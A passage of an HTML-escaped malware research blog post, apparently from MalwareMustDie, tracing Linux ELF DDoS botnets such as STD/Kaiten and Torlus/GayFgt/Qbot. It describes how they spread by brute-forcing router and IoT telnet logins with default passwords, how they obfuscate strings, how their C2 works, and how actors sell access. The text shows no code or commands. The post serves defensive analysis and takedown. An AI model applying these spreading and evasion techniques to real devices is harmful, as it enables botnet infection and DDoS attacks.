copypasta to SSH infect and confirming infection of ELF botnet)  \u003Cp\u003EFor the notes: There is no malicious infection of malware can be occurred by viewing this post, information posted are all in the textual form  and was modified in a way that will prevent the link to outside, so it is harmless, further, this blog is hosted on Google blog (thank you blogger.com) infrastructure and not in our own servers, and there is no advertisement hat so ever in this blog to avoid any chance for third party links to avoid malicious effort from our \"unhappy\" enemies.  \u003Cp\u003E\u003Ch2\u003EWhat is the source of these infection\u003C\/h2\u003E \u003Cp\u003EFor the ELF type of DDoS malware or botnet used, there are two major versions used: kaiten\/ktx\/tsunami\/STD \u003Ci\u003Emodded \u003C\/i\u003Ebase malware and Torlus(LizKebab\/GayFgt\/Bashdoor\/Bashlite) type. The rest are the Perl \"SERVIDOR\" (Perl DDoS Bot, or, aka Pbot) malware with having same purpose: IRC protocol basis remote DDoS command and control scheme to launch DDoS attack, backdoor activity and further infection. In the next sections I will give you some real samples and sources of this threat that I often tweeted in my timeline.  \u003Cp\u003EIn this post, the scheme that is used, the actors and some details of these botnets are also informed. Along with some recent obfuscation used. With these background hopefully we can make a better scheme to reduce its spread, to detect the payload with a better score from antivirus products supporting Linux platform, and to law enforcement forces to recognize which routes of badness that is adrenalized these hacks.   \u003Cp\u003E\u003Ch2\u003E1. Kaiten\/Ktx\/Tsunami\/STD backdoor\/ddos\/IRC botnet malware\u003C\/h2\u003E \u003Cp\u003ELong explanation about ELF\/Kaiten(Tsunami) I wrote it in here--\u003E\u003Ca href=\"#tsunami\"\u003Ehere\u003C\/a\u003E. \u003Cp\u003EThe recent popular and interesting sample is the kaiten-like botnet called itself as STD bot, for the STD bot historical explanation please refer to this link--\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html#stdbot\"\u003Ehere\u003C\/a\u003E, explaining why I always said \u003Cb\u003ESTD bot is not Kaiten(Tsunami)\u003C\/b\u003E, from the root of its coded. But in time, the code was heavily copypasta with kaiten bot added code..vise-versa..so, in the end, what many people see now looks almost the same codes between both threats. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-B2JsZnb_2Os\/VzGwjI--gxI\/AAAAAAAAVKw\/Pc0LWYyfTI4VCMimvj3fz_01uiYAgoTDwCLcB\/s3120\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-B2JsZnb_2Os\/VzGwjI--gxI\/AAAAAAAAVKw\/Pc0LWYyfTI4VCMimvj3fz_01uiYAgoTDwCLcB\/s580\/004.png\u003E\u003Cbr\u003E\u003Ci\u003EFigure: TheSTD bot saved variable to connect to CNC (noted: \"key\" \u0026 \"pass\"), shared for takedown knowhow purpose. \u003C\/i\u003E\u003C\/a\u003E \u003Cp\u003E\u003Cb\u003EThe encoded version of ELF\/STD bot (kaiten-like family)\u003C\/b\u003E \u003Cp\u003EThere was a chance to find the \"Encoded Version\" of STD bot, which was successfully decoded as per below video  (press the menu in the youtube video for the binary forms of BEFORE and AFTER decoding)\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/SezQaz2-8rA?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Cp\u003EObviously the original code are untouched, well..after all those hacker actors (further will be mentioned as \"skids\" short of \u003Ci\u003Escript kiddies\u003C\/i\u003E, or \"SkiDDoS\" since the purpose of them is in onto DDoS activity) in majority can't code much in C and live in copypasta (activity to copy code\/paste from others without having any process via \"brains\") land. You'll see many part matched to original STD bot code.. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-PvX1OUPiYl4\/Vw6AdkoNTbI\/AAAAAAAAUrw\/68ICw660p1IIDEy7b830KY0jKBGZ-n4swCLcB\/h2200\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-PvX1OUPiYl4\/Vw6AdkoNTbI\/AAAAAAAAUrw\/68ICw660p1IIDEy7b830KY0jKBGZ-n4swCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EAgain..see previously source codes shared to you all in the link above, as reference.  \u003Cp\u003EAnd here's its CNC communication PoC and CNC botnet access details for this version:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QY71zpv_rD8\/VwyFnzfHVHI\/AAAAAAAAUnA\/T1HQSLlC40ECjcVWnV8zIcQAKzFymR1fwCLcB\/s2120\/006.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QY71zpv_rD8\/VwyFnzfHVHI\/AAAAAAAAUnA\/T1HQSLlC40ECjcVWnV8zIcQAKzFymR1fwCLcB\/s580\/006.PNG\u003E\u003C\/a\u003E \u003Cp\u003EPlenty of this \"obfuscation\" versions are spotted in the wild:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-GC5uhZ2ObV4\/VwylOsJA3QI\/AAAAAAAAUpI\/0QF07TzqxBYh7sWAjSlN7pi-GKH0boU-ACLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-GC5uhZ2ObV4\/VwylOsJA3QI\/AAAAAAAAUpI\/0QF07TzqxBYh7sWAjSlN7pi-GKH0boU-ACLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Cb\u003ESeveral combination that might have seen\u003C\/b\u003E \u003Cp\u003EWe find a creativity from SkiDDoS who could code a bit, to improve the ancient code to be more interesting with the recent additional features with the purpose to: (1) obfuscate the threat indicator, (2) evade the DDoS attack logic to evade blocking\/mitigation, (3) for improvement of the main functionality from the ancient works..  \u003Cp\u003EBelow is the other variation with Xmas attack..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-PFGJwbR4qcw\/Vw9vp4kNIzI\/AAAAAAAAUs0\/J00dBnF3CZUbTDEuiSnbqwZsBrQHXzLNQCLcB\/s2120\/002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-PFGJwbR4qcw\/Vw9vp4kNIzI\/AAAAAAAAUs0\/J00dBnF3CZUbTDEuiSnbqwZsBrQHXzLNQCLcB\/s580\/002.PNG\u003E\u003C\/a\u003E \u003Cp\u003ESome even using message (again) \"copypasta\" from Japan anime Bakemonogatari:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nK-BTadA7YE\/Vw9vph-rVgI\/AAAAAAAAUsw\/s9tWpIBFzJMiGBMSaiKyL9Wcxz4qgfR8gCLcB\/s2260\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nK-BTadA7YE\/Vw9vph-rVgI\/AAAAAAAAUsw\/s9tWpIBFzJMiGBMSaiKyL9Wcxz4qgfR8gCLcB\/s580\/001.png\u003E\u003C\/a\u003E \u003Cp\u003EThis type is having several modification by changing strings to make the ELF looks like a weird botnets..which is a camouflage of STD bot copypasta too..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-3v2LyFHq5kU\/Vw9wUp44bgI\/AAAAAAAAUs8\/cHDlnEnUpQgkUFNWChgJ2baqPs5fcm4RwCLcB\/s2120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-3v2LyFHq5kU\/Vw9wUp44bgI\/AAAAAAAAUs8\/cHDlnEnUpQgkUFNWChgJ2baqPs5fcm4RwCLcB\/s580\/003.PNG\u003E\u003C\/a\u003E\u003Cbr\u003ESince this type is very interesting, at the time it was spotted, due to its low detection ratio, it successfully infecting several routers actually, so I wrote special post for this due to some requests and an on going infection in MMD-0052-2016, link--\u003E\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2016\/04\/mmd-0053-2016-bit-about-elfstd-irc-bot.html\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003E\u003Cb\u003EThe Sharky type of STD bot\u003C\/b\u003E \u003Cp\u003EThis type is a modded (sort of \"modified\") STD bot in recent code, compiled in \"usual\" way. The actor tend to use STDbot (sometimes along with some script basis IRC botnet), He usually serves all CNC (InspireIrcd) and the bot client spreader in a one single IP address, mostly is compromised server (but sometimes via some hosters too, rarely).  \u003Cp\u003EThis is the sample of the Sharky type--\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/c51d0c1c9b44d21250705113f616bb40ac4c5f071c327e27f603b4c297a365df\/analysis\/\"\u003Ehere\u003C\/a\u003E. And the picture below is explaining how the STD botnet protocol works during the infection, the picture also contains important information as tip\/hint on how to dissect this type of ELF botnet generally.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-KPkyEPl5y0U\/Vyi_a6nA1hI\/AAAAAAAAU74\/wGWvJYLfAskgihShg49PF9TE2KxkzSBQgCLcB\/s3120\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-KPkyEPl5y0U\/Vyi_a6nA1hI\/AAAAAAAAU74\/wGWvJYLfAskgihShg49PF9TE2KxkzSBQgCLcB\/s580\/001.png\u003E\u003C\/a\u003E  \u003Ca name=\"gayfgt\"\u003E\u003Cp\u003E\u003Ch2\u003E2. What good guys call: GayFgt\/GafGyt\/Bashdoor\/Bashlite, is what these punks call it as Torlus, LizKebab or Qbot\u003C\/h2\u003E \u003C\/a\u003E \u003Cp\u003EThis malware firstly launched in a big scale during the shellshock, in September, 2014. First detected by @yinette in--\u003E\u003Ca href=\"https:\/\/l.facebook.com\/l.php?u=https%3A%2F%2Ftwitter.com%2Fyinettesys%2Fstatus%2F515012126268604416\u0026h=-AQHtzqct\"\u003Ehere \u003C\/a\u003Eand discussed in--\u003E\u003Ca href=\"https:\/\/gist.github.com\/anonymous\/929d622f3b36b00c0be1\"\u003Ehere \u003C\/a\u003Eand then I analyzed and report it in virus total comment in--\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/73b0d95541c84965fa42c3e257bb349957b3be626dec9d55efcc6ebcba6fa489\/analysis\/1411634118\/\"\u003Ehere\u003C\/a\u003E, and made repository for the malware in kernelmode--\u003E\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3505#p23987\"\u003Ehere\u003C\/a\u003E. That time I wasn't sure to blog the threat, we call it firstly \u003Cb\u003Ebash0day malware\u003C\/b\u003E and then switch to \u003Cb\u003Ebashdoor \u003C\/b\u003Eas name, to then now all of us call it as per they wanted to be called \"\u003Cb\u003EGayFgt\u003C\/b\u003E\", as per hard coded keyword in the binary. In the dark side of the web they call it as Torlus to then Lizard Kebab\/LizKebab, along with \"other\" names to avoid researcher's radar until now.. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vYAa96pDn94\/Vwyzvk-1sAI\/AAAAAAAAUpw\/BEVFzG4WVXIhH0nBK-7o0eKoG0qBNZ9mwCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vYAa96pDn94\/Vwyzvk-1sAI\/AAAAAAAAUpw\/BEVFzG4WVXIhH0nBK-7o0eKoG0qBNZ9mwCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003EUnlike the Tsunami descendants which is very dependable to existence of IRC server's CNC and protocol, \u003Cb\u003ETorlus\/LizKebab\/GayFgt\u003C\/b\u003E(etc) is using \u003Ci\u003Eclient-and- server\u003C\/i\u003E set with its own hard-coded protocol fully inspired by the IRC basis commands (why they even call it IRCmain () function). Many influences the coder to implement this malicious, for example, it is adapting the Perl bot function used automatic scanner for telnet aiming first infection for the vulnerable linux box with the default passwords.\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Q6POspOIgTc\/VyS9ipHsBnI\/AAAAAAAAU1o\/R593Zjntc24INr3rteoUeBQoGoutcv9qQCKgB\/s8120-no\/telnet-scan-norse.mp4 width=580\u003E\u003Cbr\u003E\u003Ci\u003EPicture of on-going telnet scanner\/bruter recorded by Norse, see which country was aimed..\u003C\/i\u003E \u003Cp\u003EOn a scheme of infection (one sample),the binaries and the range of the scanning can be viewed as per pasted in here [\u003Ca href=\"https:\/\/pastebin.com\/vnhUP6Vh\"\u003Elink\u003C\/a\u003E]. Telnet scanning works will be followed by the infection to the routers using default passwords set in the codes, which is defined in three group of fields of code: [root], [login users] and the [login passwords].\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-eiShXDM2nfE\/Vwyee675MZI\/AAAAAAAAUoU\/mbmk1QVrSowXcln02GC4dOWiwBaaFr96gCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-eiShXDM2nfE\/Vwyee675MZI\/AAAAAAAAUoU\/mbmk1QVrSowXcln02GC4dOWiwBaaFr96gCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003ETelnet scanning launched after forking started, upon establishing the torlus\/gayfgt server connection:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nfwTSEqnh9g\/Vw6KEB3AG3I\/AAAAAAAAUsg\/BTUqqXyiOAEUy2tkgy4_8bC1mzu8oB2NgCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nfwTSEqnh9g\/Vw6KEB3AG3I\/AAAAAAAAUsg\/BTUqqXyiOAEUy2tkgy4_8bC1mzu8oB2NgCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-G8ovU5IEViQ\/Vzm5XYlspXI\/AAAAAAAAVMY\/9fPfXTVlV40JW4EPH0SwTVAiDO_K1azOQCLcB\/s2120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-G8ovU5IEViQ\/Vzm5XYlspXI\/AAAAAAAAVMY\/9fPfXTVlV40JW4EPH0SwTVAiDO_K1azOQCLcB\/s580\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ci\u003EFigure: Wide-range IoT \u0026 routers default login\/passwords for telnet bruteforce attack used by one Torlus actor in his compiled malware\u003C\/i\u003E \u003Cp\u003EThis malware has various DDOS options, but it is not as much as STD or Kaiten. Because of the dual functions of the malware which are: functionality as the \"spreader\" and the \"flooder\". The flood attack for this malware is shown as per below picture:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mTwtEAFYCCU\/VtCtKrRXt_I\/AAAAAAAAUbg\/DwaTKlzNsjA\/s5109\/lizkebab.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mTwtEAFYCCU\/VtCtKrRXt_I\/AAAAAAAAUbg\/DwaTKlzNsjA\/s580\/lizkebab.png\u003E\u003C\/a\u003E\u003Cbr\u003Efor the further logic please refer to the source code shared previously.  \u003Cp\u003E\u003Cb\u003EThe origin of the Torlus\u003C\/b\u003E \u003Cp\u003EThis is the original \"comment\/opinion\" taken from the coder of this malware when asked about this threat:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8xRNDQhX4ik\/VwyhOx5pbOI\/AAAAAAAAUoo\/-5IbrujD-ow4GJhovmOeFgw4MnzzG-YZwCLcB\/s2120\/Capture.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8xRNDQhX4ik\/VwyhOx5pbOI\/AAAAAAAAUoo\/-5IbrujD-ow4GJhovmOeFgw4MnzzG-YZwCLcB\/s580\/Capture.PNG\u003E\u003C\/a\u003E\u003Ca name=sinden\u003E\u003Cbr\u003E\u003Cp\u003EThe Original Command List written by the coder of this botnet:\u003Cbr\u003E\u003C\/a\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-jKqqvxU-8zs\/VyRcundW64I\/AAAAAAAAUz4\/_JGEKuQ9Cjw-ycNpGi9QHX1bysnqO1uwQCLcB\/s2120\/1001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-jKqqvxU-8zs\/VyRcundW64I\/AAAAAAAAUz4\/_JGEKuQ9Cjw-ycNpGi9QHX1bysnqO1uwQCLcB\/s580\/1001.PNG\u003E\u003C\/a\u003E \u003Cp\u003EEven there is a tutorial made by the coder:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-QYXpCk1mToA\/VyRjV0R_AKI\/AAAAAAAAU0c\/d39c73fztus8KANt5UfcXjtRiwNecpcsQCLcB\/s2120\/1002.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-QYXpCk1mToA\/VyRjV0R_AKI\/AAAAAAAAU0c\/d39c73fztus8KANt5UfcXjtRiwNecpcsQCLcB\/s580\/1002.PNG\u003E\u003C\/a\u003E \u003Cp\u003EPastebin is highly useful, isn't it skid?\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-yBdPUUfZkE8\/VyRh_M53LyI\/AAAAAAAAU0M\/LI55FvJ5B_Qf2JE_CKCHRza_q8UIauhvACLcB\/s3120\/1003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-yBdPUUfZkE8\/VyRh_M53LyI\/AAAAAAAAU0M\/LI55FvJ5B_Qf2JE_CKCHRza_q8UIauhvACLcB\/s580\/1003.PNG\u003E\u003C\/a\u003E \u003Cp\u003EThis is the picture of gayfgt\/torlus's coder bragging his owned nix boxes to get the \"buyer\"\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xxN8j8bfGhc\/VySUzcaBz0I\/AAAAAAAAU0s\/oOlnnIp6efIpN60sOefCiKoJwQYZ2AXrgCLcB\/s3120\/1004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xxN8j8bfGhc\/VySUzcaBz0I\/AAAAAAAAU0s\/oOlnnIp6efIpN60sOefCiKoJwQYZ2AXrgCLcB\/s580\/1004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWell..it seems he was breaking his own rule about screenshots.. :)\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-fxsbB7yntao\/VyTByHcmMGI\/AAAAAAAAU2A\/fIbI0PM9VtcLKQoxk0m_GK_lMJjuksRagCLcB\/s580\/1007.PNG\u003E \u003Cp\u003EThe details intelligence information of the coder can be found in here--\u003E\u003Ca href=\"http:\/\/x.malwaremustdie.org\/stat\/sinden.html\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003E\u003Cb\u003ETorlus\/LizKebab, the \"Qbot\" version:\u003C\/b\u003E \u003Cp\u003EA group of ELF botnet is using service based on GayFgt to what they call it as \"Qbot\":\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-K1GY_qkX4mI\/VwyILKCvtBI\/AAAAAAAAUnM\/-Sbot581VKE85Kag40nqJX12RK0Le5AqQCLcB\/s1120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-K1GY_qkX4mI\/VwyILKCvtBI\/AAAAAAAAUnM\/-Sbot581VKE85Kag40nqJX12RK0Le5AqQCLcB\/s580\/007.PNG\u003E\u003C\/a\u003E\u003Cp\u003EYou may wonder why using \"Qbot\" as names. Seriously, there's nothing special about that, but, since the name of GayFgt (this is the strings used to confrm an infection), Torlus or Lizkebab was published openly in the wide web, yet the bunch of actors need to communicate to each other to mention this particular malware, so they just made up a name of \"Qbot\" as reference, along with other names that they use.   \u003Cp\u003EAnother reason is, while the author was releasing the code of torlus, the telnet scanning part was having a slight bug that can be fixed only by skiddos who can code a bit of C or is having a legit contact with the coder, so..Qbot is how the skiddos mention the version which is free of the initial bug.  \u003Cp\u003EUnlike the initially released Torlus (the lizkebab) that were hitting a lot of server devices vulnerable to the bash \u003Ci\u003Eshellshock\u003C\/i\u003E, which were mostly servers or client computer with bash running, this version is meant to aim routers or IoTs with the multiple platform of binaries. Since the shellshock were patched from most of the vital services, the IoT are the leftover to have either that vulnerability along with the insecure default user\/passwords unset during deployment, and mostly telnet services are open too. So the chance to hit routers\/IoT is getting big, and it is important to have a big nodes of botnet to have a powerful flood DoS power for these skiddos. \u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EALIVE Proof that Qbot's Lizard Kebab \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ELF?src=hash\"\u003E#ELF\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/ddos?src=hash\"\u003E#ddos\u003C\/a\u003E\u0026#39;er designed to target routers in \u003Ca href=\"https:\/\/twitter.com\/hashtag\/USA?src=hash\"\u003E#USA\u003C\/a\u003E\u003Cbr\u003EReport: \u003Ca href=\"https:\/\/t.co\/yhhEFCcpzj\"\u003Ehttps:\/\/t.co\/yhhEFCcpzj\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/FBI\"\u003E@fbi\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/k2wK8Ymx8P\"\u003Epic.twitter.com\/k2wK8Ymx8P\u003C\/a\u003E\u003Cbr\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/700013035826491393\"\u003EFebruary 17, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EMore illustrated [\u003Ca href=\"http:\/\/imgur.com\/a\/WlRpJ\"\u003Edetails1\u003C\/a\u003E and \u003Ca href=\"http:\/\/imgur.com\/a\/2zRCt\"\u003Edetails2\u003C\/a\u003E] on this infection (aims routers in USA landscape)  \u003Cp\u003E\u003Cblockquote class=\"twitter-tweet\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003EMore on loonies squad vandalism attempt \u003Cbr\u003EThanks to \u003Ca href=\"https:\/\/twitter.com\/l0th1\"\u003E@l0th1\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/ftTjReacKb\"\u003Ehttps:\/\/t.co\/ftTjReacKb\u003C\/a\u003E\u003Ca href=\"https:\/\/t.co\/mpg6hLFvcQ\"\u003Ehttps:\/\/t.co\/mpg6hLFvcQ\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/DdTwfrZJc6\"\u003Epic.twitter.com\/DdTwfrZJc6\u003C\/a\u003E\u003C\/br\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/700263577853120512\"\u003EFebruary 18, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003EAnother illustration;\u003Cbr\u003E\u003Ci\u003EA skiddos botherder from US (ISP: ComCast) known as nickname of \u003Ci\u003EPacketRate \u003C\/i\u003Ewas bragging his collected Qbot modified version and promoting the sales its service as \"SwatNet\" with the below screenshot:\u003C\/i\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-LRRCpftIhEs\/VyhYhr5s3VI\/AAAAAAAAU64\/ODQNZ_IFwUQQcD22uaSa_bYDyVh08y-QACLcB\/s3120\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-LRRCpftIhEs\/VyhYhr5s3VI\/AAAAAAAAU64\/ODQNZ_IFwUQQcD22uaSa_bYDyVh08y-QACLcB\/s580\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003EEven the size of botnet controlled by this kid is 14.5k, it's considerably smaller compared to veteran herders. As Qbot is aiming servers and routers, could be our device is owned by this kid. And all of this for the DDoS purpose..  \u003Cp\u003EAdditional illustration: One real case of GayFgt(Torlus) was designed specifically to infect routers with hacking its busybox as per posted in kernelmode--\u003E\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3966\u0026p=28460#p28460\"\u003Ehere\u003C\/a\u003E.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-7yGawLfW3jw\/Vyu9oPHZO6I\/AAAAAAAAU9c\/Ym6Z13Vk0YQI9VEwpuApRxt624STPp_iACLcB\/s2666\/001.jpg\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-7yGawLfW3jw\/Vyu9oPHZO6I\/AAAAAAAAU9c\/Ym6Z13Vk0YQI9VEwpuApRxt624STPp_iACLcB\/s580\/001.jpg\u003E\u003C\/a\u003E\u003Cbr\u003E \u003Cp\u003EA skiddos called himself \"TheVillain\" launch promotion for DDoS as Service by selling spot of his Qbot:\u003Cbr\u003E\u003Ciframe width=\"580\" height=\"326\" src=\"https:\/\/www.youtube.com\/embed\/47TESdhNZSk?rel=0\u0026amp;controls=0\u0026amp;showinfo=0\" frameborder=\"0\" allowfullscreen\u003E\u003C\/iframe\u003E \u003Ca name=\"torlusprivate\"\u003E\u003Cbr\u003E\u003Cp\u003E\u003Ch2\u003ETorlus\/Lizkebab\/GayFgt\/Bashdoor without Telnet scanning\u003C\/h2\u003E \u003C\/a\u003E\u003Cp\u003EOne day Xylit0l informed me to look at kernelmode on a Gayfgt case, which lead to this version. This one has no telnet scanner on its setup. I found this version was the private version code basis. The actor seems avoiding the \"noise\" of traffic in telnet scanning \u0026 bruting. Our intelligence also found it matcged to a modified version that was announced by the coder in his \"private club\". So it runs as backdoor and act with the 100% remote DDoS bot function. Below is the code screenshots:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-zt9SoNlqi7s\/Vyv03PjrClI\/AAAAAAAAVEI\/9wukq0IrTlgmdELCh5ZARlGpAvmiGAXnwCLcB\/s2666\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-zt9SoNlqi7s\/Vyv03PjrClI\/AAAAAAAAVEI\/9wukq0IrTlgmdELCh5ZARlGpAvmiGAXnwCLcB\/s400\/002.png\u003E\u003C\/a\u003E\u003Cbr\u003EI disassembled as below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-1HedqTAPqcM\/Vyv4kd1m-EI\/AAAAAAAAVEs\/IhF0mXKe-e4RSvZ-6wKCNJxVZzQpeA5xACLcB\/s2666\/001.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-1HedqTAPqcM\/Vyv4kd1m-EI\/AAAAAAAAVEs\/IhF0mXKe-e4RSvZ-6wKCNJxVZzQpeA5xACLcB\/s580\/001.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EFor more detail of this version please see posts in--\u003E\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3966\u0026p=28461#p28461\"\u003Ehere\u003C\/a\u003E.  \u003Cp\u003E\u003Ch2\u003ETorlus\/Lizkebab\/GayFgt's server console in action\u003C\/h2\u003E \u003Cp\u003EI call it \"in action\" because this is actually a copypasta modified Torlus server side renamed as \"Palkia\", the picture was snagged directly from skiddos who bragged about this:\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-VvqPM9mrp3M\/V2Qt0BFdQ4I\/AAAAAAAAVak\/8OPVyV-RF742qYQ-qjODVyH5yo4zfLWQgCLcB\/s580\/201.PNG\u003E\u003Cbr\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-hc_2fauBbVU\/V2Qt0LUaUjI\/AAAAAAAAVao\/h_QNM0xHWbE-IRI9zu9xm3tqYXQ5j5A0QCLcB\/s580\/202.PNG\u003E \u003Ca name=\"torlusblj\"\u003E\u003Cbr\u003E \u003Cp\u003E\u003Ch2\u003EBLJ and the Torlus\/Lizkebab\/GayFgt\/Bashdoor\/Bashlite in encoded form\u003C\/h2\u003E \u003C\/a\u003E \u003Cp\u003EPlaying around with this new sample--\u003E\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/b91174e0e79b072f400790d4d91ee944417747d7adc2424f68088a3c9c01ce53\/analysis\/1460150975\/\"\u003Esample\u003C\/a\u003E \u003C!-- l --\u003E\u003Ca class=\"postlink-local\" href=\"http:\/\/www.kernelmode.info\/forum\/posting.php?mode=reply\u0026amp;f=16\u0026amp;t=3505#pr28248\"\u003Ethread=16\u0026amp;t=3505#pr28248\u003C\/a\u003E\u003C!-- l --\u003E to find out that the hacktivists has obfuscated the strings in the ELF of Torlus\/Lizkebab\/GayFgt\/Bashdoor\/Bashlite malware. Thank you for a good person who send this sample directly to us.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-h7IQuYn39Zg\/VwgrYgXl4hI\/AAAAAAAAUiU\/MlOP9GiPb9cXuVIwrRW-PV1DGN1z33S6A\/s1720\/Capture0.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-h7IQuYn39Zg\/VwgrYgXl4hI\/AAAAAAAAUiU\/MlOP9GiPb9cXuVIwrRW-PV1DGN1z33S6A\/s580\/Capture0.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThis piece of malware was coded based on original Torlus client inside of those garbled codes, it was in encoded\/string-obfuscated form, w\/stripped and distributed with no intel architecture samples ..it's fine for all of us:-) since my major reverse engineering is for UNIX embed device anyway. \u003Cp\u003EThe \"encoding\" goes on both side: the client and server version.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-G8NqwLL-ZZ8\/VwyNhoV2XgI\/AAAAAAAAUng\/9g3yNSuhLUkogsHa2wMA0WSVa6iVlaq4wCLcB\/s1120\/009.PNG\"\u003E\u003Cimg 